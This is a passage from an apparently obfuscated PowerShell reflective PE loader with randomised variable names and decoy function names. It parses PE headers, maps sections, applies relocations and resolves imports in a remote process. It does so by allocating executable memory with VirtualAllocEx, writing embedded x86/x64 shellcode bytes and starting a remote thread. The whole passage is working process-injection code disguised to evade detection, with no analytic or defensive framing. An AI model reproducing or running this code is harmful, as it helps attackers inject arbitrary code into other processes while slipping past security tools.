		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$RSQarPVG99 = [IntPtr](federally ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$fsGKSFYp99.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $RSQarPVG99
		}
		else
		{
			[IntPtr]$RSQarPVG99 = [IntPtr](federally ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$fsGKSFYp99.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $RSQarPVG99
		}
		
		if (($OSyzFiDu99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($OSyzFiDu99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function pommeled
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$lDVqRULn99,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ySetVVRy99
		)
		
		$tkDghQTk99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$YonhhIpB99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ySetVVRy99)
		$DTPudrhI99 = [UIntPtr][UInt64]([UInt64]$YonhhIpB99.Length + 1)
		$pxSCjgcD99 = $tFmeXFwi99.VirtualAllocEx.Invoke($lDVqRULn99, [IntPtr]::Zero, $DTPudrhI99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($pxSCjgcD99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}
		[UIntPtr]$XsXKnFGs99 = [UIntPtr]::Zero
		$gTWWHesS99 = $tFmeXFwi99.WriteProcessMemory.Invoke($lDVqRULn99, $pxSCjgcD99, $ySetVVRy99, $DTPudrhI99, [Ref]$XsXKnFGs99)
		
		if ($gTWWHesS99 -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DTPudrhI99 -ne $XsXKnFGs99)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$PbFFltLi99 = $tFmeXFwi99.GetModuleHandle.Invoke("kernel32.dll")
		$tAQcoaKF99 = $tFmeXFwi99.GetProcAddress.Invoke($PbFFltLi99, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$QQfRTKLc99 = [IntPtr]::Zero
		if ($PEInfo.PE64Bit -eq $true)
		{
			$xhmefBdW99 = $tFmeXFwi99.VirtualAllocEx.Invoke($lDVqRULn99, [IntPtr]::Zero, $DTPudrhI99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($xhmefBdW99 -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			$JLNAwCWo99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$kTucrgvy99 = @(0x48, 0xba)
			$ikKsdCVj99 = @(0xff, 0xd2, 0x48, 0xba)
			$RlllmFmb99 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$qjUUrHfn99 = $JLNAwCWo99.Length + $kTucrgvy99.Length + $ikKsdCVj99.Length + $RlllmFmb99.Length + ($tkDghQTk99 * 3)
			$qRxdBxjK99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($qjUUrHfn99)
			$LXbMBRwW99 = $qRxdBxjK99
			
			manufacture -Bytes $JLNAwCWo99 -EwGuMsLx99 $qRxdBxjK99
			$qRxdBxjK99 = federally $qRxdBxjK99 ($JLNAwCWo99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($pxSCjgcD99, $qRxdBxjK99, $false)
			$qRxdBxjK99 = federally $qRxdBxjK99 ($tkDghQTk99)
			manufacture -Bytes $kTucrgvy99 -EwGuMsLx99 $qRxdBxjK99
			$qRxdBxjK99 = federally $qRxdBxjK99 ($kTucrgvy99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($tAQcoaKF99, $qRxdBxjK99, $false)
			$qRxdBxjK99 = federally $qRxdBxjK99 ($tkDghQTk99)
			manufacture -Bytes $ikKsdCVj99 -EwGuMsLx99 $qRxdBxjK99
			$qRxdBxjK99 = federally $qRxdBxjK99 ($ikKsdCVj99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($xhmefBdW99, $qRxdBxjK99, $false)
			$qRxdBxjK99 = federally $qRxdBxjK99 ($tkDghQTk99)
			manufacture -Bytes $RlllmFmb99 -EwGuMsLx99 $qRxdBxjK99
			$qRxdBxjK99 = federally $qRxdBxjK99 ($RlllmFmb99.Length)
			
			$GaAnhdqE99 = $tFmeXFwi99.VirtualAllocEx.Invoke($lDVqRULn99, [IntPtr]::Zero, [UIntPtr][UInt64]$qjUUrHfn99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($GaAnhdqE99 -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$gTWWHesS99 = $tFmeXFwi99.WriteProcessMemory.Invoke($lDVqRULn99, $GaAnhdqE99, $LXbMBRwW99, [UIntPtr][UInt64]$qjUUrHfn99, [Ref]$XsXKnFGs99)
			if (($gTWWHesS99 -eq $false) -or ([UInt64]$XsXKnFGs99 -ne [UInt64]$qjUUrHfn99))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$MLesLGoP99 = impregnation -gmLJonUI99 $lDVqRULn99 -StartAddress $GaAnhdqE99 -tFmeXFwi99 $tFmeXFwi99
			$IUgPuxxH99 = $tFmeXFwi99.WaitForSingleObject.Invoke($MLesLGoP99, 20000)
			if ($IUgPuxxH99 -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[IntPtr]$XCAKQYNZ99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($tkDghQTk99)
			$IUgPuxxH99 = $tFmeXFwi99.ReadProcessMemory.Invoke($lDVqRULn99, $xhmefBdW99, $XCAKQYNZ99, [UIntPtr][UInt64]$tkDghQTk99, [Ref]$XsXKnFGs99)
			if ($IUgPuxxH99 -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$QQfRTKLc99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($XCAKQYNZ99, [Type][IntPtr])
			$tFmeXFwi99.VirtualFreeEx.Invoke($lDVqRULn99, $xhmefBdW99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$tFmeXFwi99.VirtualFreeEx.Invoke($lDVqRULn99, $GaAnhdqE99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$MLesLGoP99 = impregnation -gmLJonUI99 $lDVqRULn99 -StartAddress $tAQcoaKF99 -GgUQRiWy99 $pxSCjgcD99 -tFmeXFwi99 $tFmeXFwi99
			$IUgPuxxH99 = $tFmeXFwi99.WaitForSingleObject.Invoke($MLesLGoP99, 20000)
			if ($IUgPuxxH99 -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$qBUnOPFE99 = 0
			$IUgPuxxH99 = $tFmeXFwi99.GetExitCodeThread.Invoke($MLesLGoP99, [Ref]$qBUnOPFE99)
			if (($IUgPuxxH99 -eq 0) -or ($qBUnOPFE99 -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$QQfRTKLc99 = [IntPtr]$qBUnOPFE99
		}
		
		$tFmeXFwi99.VirtualFreeEx.Invoke($lDVqRULn99, $pxSCjgcD99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $QQfRTKLc99
	}
	
	
	Function hymnals
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$lDVqRULn99,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$TUSxnKAT99,
		
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		$FunctionName
		)
		$tkDghQTk99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$fCDBIUIq99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
		
		$BXgWVlgw99 = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		$oovCbJfO99 = $tFmeXFwi99.VirtualAllocEx.Invoke($lDVqRULn99, [IntPtr]::Zero, $BXgWVlgw99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($oovCbJfO99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}
		[UIntPtr]$XsXKnFGs99 = [UIntPtr]::Zero
		$gTWWHesS99 = $tFmeXFwi99.WriteProcessMemory.Invoke($lDVqRULn99, $oovCbJfO99, $fCDBIUIq99, $BXgWVlgw99, [Ref]$XsXKnFGs99)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($fCDBIUIq99)
		if ($gTWWHesS99 -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($BXgWVlgw99 -ne $XsXKnFGs99)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$PbFFltLi99 = $tFmeXFwi99.GetModuleHandle.Invoke("kernel32.dll")
		$BliuwjTH99 = $tFmeXFwi99.GetProcAddress.Invoke($PbFFltLi99, "GetProcAddress") #Kernel32 loaded to the same address for all processes
		
		$ZcCGKiGg99 = $tFmeXFwi99.VirtualAllocEx.Invoke($lDVqRULn99, [IntPtr]::Zero, [UInt64][UInt64]$tkDghQTk99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($ZcCGKiGg99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		[Byte[]]$XljFBkwW99 = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$IKwbOxsZ99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$sITjyTSY99 = @(0x48, 0xba)
			$hKDwkKNF99 = @(0x48, 0xb8)
			$BorQgLyF99 = @(0xff, 0xd0, 0x48, 0xb9)
			$iePDXNUK99 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$IKwbOxsZ99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$sITjyTSY99 = @(0xb9)
			$hKDwkKNF99 = @(0x51, 0x50, 0xb8)
			$BorQgLyF99 = @(0xff, 0xd0, 0xb9)
			$iePDXNUK99 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$qjUUrHfn99 = $IKwbOxsZ99.Length + $sITjyTSY99.Length + $hKDwkKNF99.Length + $BorQgLyF99.Length + $iePDXNUK99.Length + ($tkDghQTk99 * 4)
		$qRxdBxjK99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($qjUUrHfn99)
		$LXbMBRwW99 = $qRxdBxjK99
		
		manufacture -Bytes $IKwbOxsZ99 -EwGuMsLx99 $qRxdBxjK99
		$qRxdBxjK99 = federally $qRxdBxjK99 ($IKwbOxsZ99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TUSxnKAT99, $qRxdBxjK99, $false)
		$qRxdBxjK99 = federally $qRxdBxjK99 ($tkDghQTk99)
		manufacture -Bytes $sITjyTSY99 -EwGuMsLx99 $qRxdBxjK99
		$qRxdBxjK99 = federally $qRxdBxjK99 ($sITjyTSY99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($oovCbJfO99, $qRxdBxjK99, $false)
		$qRxdBxjK99 = federally $qRxdBxjK99 ($tkDghQTk99)
		manufacture -Bytes $hKDwkKNF99 -EwGuMsLx99 $qRxdBxjK99
		$qRxdBxjK99 = federally $qRxdBxjK99 ($hKDwkKNF99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($BliuwjTH99, $qRxdBxjK99, $false)
		$qRxdBxjK99 = federally $qRxdBxjK99 ($tkDghQTk99)
		manufacture -Bytes $BorQgLyF99 -EwGuMsLx99 $qRxdBxjK99
		$qRxdBxjK99 = federally $qRxdBxjK99 ($BorQgLyF99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($ZcCGKiGg99, $qRxdBxjK99, $false)
		$qRxdBxjK99 = federally $qRxdBxjK99 ($tkDghQTk99)
		manufacture -Bytes $iePDXNUK99 -EwGuMsLx99 $qRxdBxjK99
		$qRxdBxjK99 = federally $qRxdBxjK99 ($iePDXNUK99.Length)
		
		$GaAnhdqE99 = $tFmeXFwi99.VirtualAllocEx.Invoke($lDVqRULn99, [IntPtr]::Zero, [UIntPtr][UInt64]$qjUUrHfn99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($GaAnhdqE99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		
		$gTWWHesS99 = $tFmeXFwi99.WriteProcessMemory.Invoke($lDVqRULn99, $GaAnhdqE99, $LXbMBRwW99, [UIntPtr][UInt64]$qjUUrHfn99, [Ref]$XsXKnFGs99)
		if (($gTWWHesS99 -eq $false) -or ([UInt64]$XsXKnFGs99 -ne [UInt64]$qjUUrHfn99))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$MLesLGoP99 = impregnation -gmLJonUI99 $lDVqRULn99 -StartAddress $GaAnhdqE99 -tFmeXFwi99 $tFmeXFwi99
		$IUgPuxxH99 = $tFmeXFwi99.WaitForSingleObject.Invoke($MLesLGoP99, 20000)
		if ($IUgPuxxH99 -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		[IntPtr]$XCAKQYNZ99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($tkDghQTk99)
		$IUgPuxxH99 = $tFmeXFwi99.ReadProcessMemory.Invoke($lDVqRULn99, $ZcCGKiGg99, $XCAKQYNZ99, [UIntPtr][UInt64]$tkDghQTk99, [Ref]$XsXKnFGs99)
		if (($IUgPuxxH99 -eq $false) -or ($XsXKnFGs99 -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$StqKKDjO99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($XCAKQYNZ99, [Type][IntPtr])
		$tFmeXFwi99.VirtualFreeEx.Invoke($lDVqRULn99, $GaAnhdqE99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$tFmeXFwi99.VirtualFreeEx.Invoke($lDVqRULn99, $oovCbJfO99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$tFmeXFwi99.VirtualFreeEx.Invoke($lDVqRULn99, $ZcCGKiGg99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $StqKKDjO99
	}
	Function ogling
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$NJImiPos99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$tFmeXFwi99,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$fsGKSFYp99
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$RSQarPVG99 = [IntPtr](federally ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$fsGKSFYp99.IMAGE_SECTION_HEADER)))
			$SaVqDsAt99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RSQarPVG99, [Type]$fsGKSFYp99.IMAGE_SECTION_HEADER)
		
			[IntPtr]$JpddHrkl99 = [IntPtr](federally ([Int64]$PEInfo.PEHandle) ([Int64]$SaVqDsAt99.VirtualAddress))
			
			$vIyJnHLQ99 = $SaVqDsAt99.SizeOfRawData
			if ($SaVqDsAt99.PointerToRawData -eq 0)
			{
				$vIyJnHLQ99 = 0
			}
			
			if ($vIyJnHLQ99 -gt $SaVqDsAt99.VirtualSize)
			{
				$vIyJnHLQ99 = $SaVqDsAt99.VirtualSize
			}
			
			if ($vIyJnHLQ99 -gt 0)
			{
				geniuses -KbloWTRq99 "ogling::MarshalCopy" -PEInfo $PEInfo -StartAddress $JpddHrkl99 -Size $vIyJnHLQ99 | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($NJImiPos99, [Int32]$SaVqDsAt99.PointerToRawData, $JpddHrkl99, $vIyJnHLQ99)
			}
		
			if ($SaVqDsAt99.SizeOfRawData -lt $SaVqDsAt99.VirtualSize)
			{
				$oBzjbDYP99 = $SaVqDsAt99.VirtualSize - $vIyJnHLQ99
				[IntPtr]$StartAddress = [IntPtr](federally ([Int64]$JpddHrkl99) ([Int64]$vIyJnHLQ99))
				geniuses -KbloWTRq99 "ogling::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $oBzjbDYP99 | Out-Null
				$tFmeXFwi99.memset.Invoke($StartAddress, 0, [IntPtr]$oBzjbDYP99) | Out-Null
			}
		}
	}
	Function crayoned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$dmDMjxqO99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$fsGKSFYp99
		)
		
		[Int64]$yUFJwiVg99 = 0
		$iAgoRJNd99 = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$PACysXRU99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$fsGKSFYp99.IMAGE_BASE_RELOCATION)
		
		if (($dmDMjxqO99 -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}
		elseif ((assert ($dmDMjxqO99) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$yUFJwiVg99 = brontosauri ($dmDMjxqO99) ($PEInfo.EffectivePEHandle)
			$iAgoRJNd99 = $false
		}
		elseif ((assert ($PEInfo.EffectivePEHandle) ($dmDMjxqO99)) -eq $true)
		{
			$yUFJwiVg99 = brontosauri ($PEInfo.EffectivePEHandle) ($dmDMjxqO99)
		}
		
		[IntPtr]$uYEtSLaN99 = [IntPtr](federally ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			$aHMVNbtS99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($uYEtSLaN99, [Type]$fsGKSFYp99.IMAGE_BASE_RELOCATION)
			if ($aHMVNbtS99.SizeOfBlock -eq 0)
			{
				break
			}
			[IntPtr]$vyeIFQtM99 = [IntPtr](federally ([Int64]$PEInfo.PEHandle) ([Int64]$aHMVNbtS99.VirtualAddress))
			$SIFHQmDN99 = ($aHMVNbtS99.SizeOfBlock - $PACysXRU99) / 2
			for($i = 0; $i -lt $SIFHQmDN99; $i++)
			{
				$srXkZfuV99 = [IntPtr](federally ([IntPtr]$uYEtSLaN99) ([Int64]$PACysXRU99 + (2 * $i)))
				[UInt16]$SUzjyFZc99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($srXkZfuV99, [Type][UInt16])
				[UInt16]$fTpMhaDx99 = $SUzjyFZc99 -band 0x0FFF
				[UInt16]$UGIbkyTr99 = $SUzjyFZc99 -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$UGIbkyTr99 = [Math]::Floor($UGIbkyTr99 / 2)
				}
				if (($UGIbkyTr99 -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($UGIbkyTr99 -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					[IntPtr]$DBLgLjdV99 = [IntPtr](federally ([Int64]$vyeIFQtM99) ([Int64]$fTpMhaDx99))
					[IntPtr]$LVAVofQV99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($DBLgLjdV99, [Type][IntPtr])
		
					if ($iAgoRJNd99 -eq $true)
					{
						[IntPtr]$LVAVofQV99 = [IntPtr](federally ([Int64]$LVAVofQV99) ($yUFJwiVg99))
					}
					else
					{
						[IntPtr]$LVAVofQV99 = [IntPtr](brontosauri ([Int64]$LVAVofQV99) ($yUFJwiVg99))
					}				
					[System.Runtime.InteropServices.Marshal]::StructureToPtr($LVAVofQV99, $DBLgLjdV99, $false) | Out-Null
				}
				elseif ($UGIbkyTr99 -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					Throw "Unknown relocation found, relocation value: $UGIbkyTr99, relocationinfo: $SUzjyFZc99"
				}
			}
			
			$uYEtSLaN99 = [IntPtr](federally ([Int64]$uYEtSLaN99) ([Int64]$aHMVNbtS99.SizeOfBlock))
		}
	}
	Function Fokker
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$tFmeXFwi99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$fsGKSFYp99,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$lDVqRULn99
		)
		
		$UTndHzZD99 = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$UTndHzZD99 = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$tGsSkXmW99 = federally ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$vMfcpWxk99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($tGsSkXmW99, [Type]$fsGKSFYp99.IMAGE_IMPORT_DESCRIPTOR)
				
				if ($vMfcpWxk99.Characteristics -eq 0 `
						-and $vMfcpWxk99.FirstThunk -eq 0 `
						-and $vMfcpWxk99.ForwarderChain -eq 0 `
						-and $vMfcpWxk99.Name -eq 0 `
						-and $vMfcpWxk99.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}
				$NoxXkfFm99 = [IntPtr]::Zero
				$ySetVVRy99 = (federally ([Int64]$PEInfo.PEHandle) ([Int64]$vMfcpWxk99.Name))
				$YonhhIpB99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ySetVVRy99)
				
				if ($UTndHzZD99 -eq $true)
				{
					$NoxXkfFm99 = pommeled -lDVqRULn99 $lDVqRULn99 -ySetVVRy99 $ySetVVRy99
				}
				else
				{
					$NoxXkfFm99 = $tFmeXFwi99.LoadLibrary.Invoke($YonhhIpB99)
				}
				if (($NoxXkfFm99 -eq $null) -or ($NoxXkfFm99 -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $YonhhIpB99"
				}
				
				[IntPtr]$tNYloKaF99 = federally ($PEInfo.PEHandle) ($vMfcpWxk99.FirstThunk)
				[IntPtr]$iTBwIuOs99 = federally ($PEInfo.PEHandle) ($vMfcpWxk99.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$IfebkoOZ99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($iTBwIuOs99, [Type][IntPtr])
				
				while ($IfebkoOZ99 -ne [IntPtr]::Zero)
				{
					$YKctkRVg99 = ''
					[IntPtr]$zuGDRXNV99 = [IntPtr]::Zero
					if([Int64]$IfebkoOZ99 -lt 0)
					{
						$YKctkRVg99 = [Int64]$IfebkoOZ99 -band 0xffff #This is actually a lookup by ordinal
					}
					else
					{
						[IntPtr]$eIaZGNPw99 = federally ($PEInfo.PEHandle) ($IfebkoOZ99)
						$eIaZGNPw99 = federally $eIaZGNPw99 ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$YKctkRVg99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($eIaZGNPw99)
					}
					
					if ($UTndHzZD99 -eq $true)
					{
						[IntPtr]$zuGDRXNV99 = hymnals -lDVqRULn99 $lDVqRULn99 -TUSxnKAT99 $NoxXkfFm99 -FunctionName $YKctkRVg99
					}
					else
					{
						if($YKctkRVg99 -is [string])
						{
						    [IntPtr]$zuGDRXNV99 = $tFmeXFwi99.GetProcAddress.Invoke($NoxXkfFm99, $YKctkRVg99)
						}
						else
						{
						    [IntPtr]$zuGDRXNV99 = $tFmeXFwi99.GetProcAddressOrdinal.Invoke($NoxXkfFm99, $YKctkRVg99)
						}
					}
					
					if ($zuGDRXNV99 -eq $null -or $zuGDRXNV99 -eq [IntPtr]::Zero)
					{
						Throw "New function reference is null, this is almost certainly a bug in this script. Function: $YKctkRVg99. Dll: $YonhhIpB99"
					}
					[System.Runtime.InteropServices.Marshal]::StructureToPtr($zuGDRXNV99, $tNYloKaF99, $false)
					
					$tNYloKaF99 = federally ([Int64]$tNYloKaF99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$iTBwIuOs99 = federally ([Int64]$iTBwIuOs99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$IfebkoOZ99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($iTBwIuOs99, [Type][IntPtr])
				}
				
				$tGsSkXmW99 = federally ($tGsSkXmW99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$fsGKSFYp99.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}
	Function pushiest
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$hvbIWJwW99
		)
		
		$JvOimTkM99 = 0x0
		if (($hvbIWJwW99 -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($hvbIWJwW99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($hvbIWJwW99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$JvOimTkM99 = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$JvOimTkM99 = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($hvbIWJwW99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$JvOimTkM99 = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$JvOimTkM99 = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($hvbIWJwW99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($hvbIWJwW99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$JvOimTkM99 = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$JvOimTkM99 = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($hvbIWJwW99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$JvOimTkM99 = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$JvOimTkM99 = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($hvbIWJwW99 -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$JvOimTkM99 = $JvOimTkM99 -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $JvOimTkM99
	}
	Function anathema
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$tFmeXFwi99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$fsGKSFYp99
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$RSQarPVG99 = [IntPtr](federally ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$fsGKSFYp99.IMAGE_SECTION_HEADER)))
			$SaVqDsAt99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RSQarPVG99, [Type]$fsGKSFYp99.IMAGE_SECTION_HEADER)
